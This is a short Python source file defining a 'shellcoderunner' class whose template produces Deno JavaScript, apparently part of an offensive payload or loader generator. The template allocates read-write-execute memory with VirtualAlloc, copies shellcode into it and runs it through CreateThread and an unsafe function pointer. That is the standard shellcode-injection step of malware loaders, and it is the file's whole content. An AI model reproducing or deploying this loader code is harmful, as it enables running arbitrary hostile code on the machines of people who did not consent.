class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []
    
    def codeblocks(self) -> str:
        return ''

    def template(self) -> str:
        return """
    {transformers}

    const address = {VirtualAlloc}(null, {shellcodeSize}, 0x3000, 0x40);
    const view = Deno.UnsafePointerView.getArrayBuffer(address, {shellcodeSize});
    const destView = new Uint8Array(view);
    destView.set(shellcode);

    const threadIdBuffer = new Uint32Array(1);
    const hThread = {CreateThread}(null, 0, address, null, 0, null);
    const fn = new Deno.UnsafeFnPointer(address, {{
        parameters: [],
        result: "void", // Adjust if your code returns a value (e.g., "i32")
    }});
        
    fn.call()        
    {WaitForSingleObject}(hThread, 0xFFFFFFFF);

"""